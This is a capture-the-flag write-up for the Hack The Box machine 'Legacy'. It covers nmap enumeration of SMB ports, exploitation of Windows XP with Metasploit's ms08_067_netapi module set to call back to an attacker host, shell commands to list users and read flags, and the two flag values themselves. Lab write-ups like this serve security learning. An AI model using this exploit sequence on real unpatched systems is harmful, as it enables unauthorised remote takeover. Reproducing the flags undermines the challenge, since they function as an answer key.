# Legacy — HTB Writeup

**Author:** Ph4n3s  
**Difficulty:** Easy  
**OS:** Windows XP  

---

## 1. Enumeration

We start with a `ping -c 5` to the machine. It replies with TTL 127, which tells us it is a Windows machine (Linux usually gives 64, Windows 128, and it drops by one as it passes through a hop).

### 1.1 Open port scan

```bash
nmap -p- --open -T4 --min-rate 5000 10.129.227.181 -oN ~/HTB_machines/Legacy/ports
```

```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### 1.2 Scan dedicated to the open ports

```bash
nmap -p 135,139,445 -T4 --min-rate 5000 -sVC 10.129.227.181 -oN ~/HTB_machines/Legacy/targeted
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   Computer name: legacy
|   Workgroup: HTB
| smb-security-mode:
|   account_used: guest
|   message_signing: disabled (dangerous, but default)
```

We confirm it is a **Windows XP**, an unsupported system. The three open ports (135, 139, 445) are classic SMB/RPC services with known vulnerabilities. Time to find an exploit.

---

## 2. Exploitation

The chosen exploit is `exploit/windows/smb/ms08_067_netapi`, a critical vulnerability in the Windows Server service that affects XP SP2/SP3 and allows unauthenticated remote code execution.

We start `msfconsole` and configure:

```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.129.227.181
set LHOST 10.10.16.120
run
```

Within seconds we have a meterpreter session. We switch to an interactive shell:

```
shell
```

We list the system users:

```
net user
```

```
Administrator   Guest   HelpAssistant   john   SUPPORT_388945a0
```

---

## 3. Post-exploitation

### 3.1 User flag

Important: on Windows XP the profiles are **not in `C:\Users`** (that is Vista onward), but in:

```
C:\Documents and Settings\
```

You have to use quotes because the path has spaces:

```
cd "C:\Documents and Settings\john\Desktop"
type user.txt
```

**User flag:** `e69af0e4f443de7e36876fda4ec7644f`

### 3.2 Administrator flag

Since we entered directly as SYSTEM with the exploit, we have full access with no need to escalate privileges:

```
cd "C:\Documents and Settings\Administrator\Desktop"
type root.txt
```

**Root flag:** `993442d258b0e0ec917cae9e695d5713`

---

## Conclusion

A simple but very educational machine for understanding how SMB exploitation works on unpatched systems. The `ms08_067_netapi` exploit is practically automatic, which makes it ideal to get started with Metasploit.

What I took away: do not assume modern Windows paths on old systems — `C:\Users` does not exist on XP.
